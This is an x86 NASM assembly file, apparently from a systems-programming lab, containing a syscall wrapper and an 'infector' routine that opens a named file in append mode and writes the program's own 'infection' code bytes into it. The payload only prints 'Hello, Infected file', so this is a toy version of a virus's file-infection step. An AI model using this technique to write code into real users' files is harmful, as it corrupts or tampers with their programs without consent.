section .data
    msg: db 'Hello, Infected file', 10, 0

section .bss			; we define (global) uninitialized variables in .bss section
	str: resb 100		; For the name of the file in infector.
    
section .text
    global _start
    global system_call
    extern main
    global infector

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:

infection:
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad                  ; Save some more caller state
    mov     eax, 4          ; Copy function args to registers: leftmost...        
    mov     ebx, 1          ; Next argument...
    mov     ecx, msg        ; Next argument...
    mov     edx, 22         ; Next argument...
    int     0x80            ; Transfer control to operating system
    popad                   ; Restore caller state (registers)
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

infector:
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad                  ; Save some more caller state

;    mov     eax, 4          ; Copy function args to registers: leftmost...        
;    mov     ebx, 1          ; Next argument...
;    mov ecx, dword [ebp+8]  ; get function argument (pointer to string).
;    mov     edx, 5          ; Next argument...
;    int     0x80            ; Transfer control to operating system

    mov     eax, 5          ; open        
    mov     ebx, dword [ebp+8]        ; get function argument (pointer to string).nt
    mov     ecx, 1025       ; Next argument...
    mov     edx, 0777       ; Next argument...
    int     0x80            ; Transfer control to operating system

    mov     esi, eax        ; Save file descriptor.

    mov     eax, 4          ; Write   
    mov     ebx, esi        ; fd
    mov     ecx, code_start ; buffer.
    mov     edx, 89         ; Maximal length.
    int     0x80            ; Transfer control to operating system

    mov     eax, 6          ; close.       
    mov     ebx, esi        ; fd.
    int     0x80            ; Transfer control to operating system

    popad                   ; Restore caller state (registers)
    pop     ebp             ; Restore caller state
    ret   

code_end:
    
